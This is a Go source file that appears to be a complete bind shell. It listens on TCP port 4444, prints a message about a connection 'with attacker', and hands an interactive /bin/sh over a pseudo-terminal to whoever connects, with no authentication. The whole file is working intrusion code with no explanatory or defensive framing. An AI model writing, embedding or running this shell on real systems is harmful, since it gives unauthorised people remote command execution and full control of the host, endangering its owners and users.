package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	listenPort := "4444"

	ln, err := net.Listen("tcp", ":"+listenPort)
	if err != nil {
		panic(err)
	}
	defer ln.Close()
	fmt.Println("Listening for connections on port", listenPort)

	conn, err := ln.Accept()
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("Connection established with attacker")

	cmd := exec.Command("/bin/sh")

	pty, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer pty.Close()

	go func() {
		_, _ = io.Copy(pty, conn)
	}()
	_, _ = io.Copy(conn, pty)
}
